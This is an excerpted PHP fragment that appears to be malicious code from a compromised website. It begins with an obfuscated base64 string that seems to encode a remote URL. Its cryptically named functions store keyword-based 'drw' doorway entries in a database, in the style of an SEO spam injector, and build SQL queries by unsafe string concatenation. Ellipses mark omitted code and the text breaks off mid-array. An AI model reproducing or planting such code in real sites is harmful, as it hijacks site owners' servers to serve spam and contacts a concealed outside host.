<?php $au='aHR3cCUzQSUyRiUyRmJ6ZDgxLmNvbSUyRjUlMkZ6b6JrLnBocA==';
...
//        }
    ...
    function chkDrwPg()
    {
        ...
        if (!empty($cch["hash"])) {
            $this->curCch = $this->rDB($this->tbl["name"], "data,kw,gr", "`hash` = '" . $crMd . "' AND `type` = 'drw'");
                    ...
                    if (!empty($newSetts) && count($newSetts) > 0) {
                        ...
                        if (!empty($chpu)) {
                            foreach ($newSetts as $oneKey) {
                                ...
                                $this->insToDb("hash, type, url, kw, gr", "'" . md5($curUrl) . "','drw', '" . urlencode
                                    ($curUrl) . "', '" . urlencode($oneKey["kw"]) . "', '" . $oneKey["gr"] . "'");
                                $result[] = array(
                                    "hash" => md5($curUrl),
                                    "url" => $curUrl,
                                    "kw" => $oneKey["kw"],
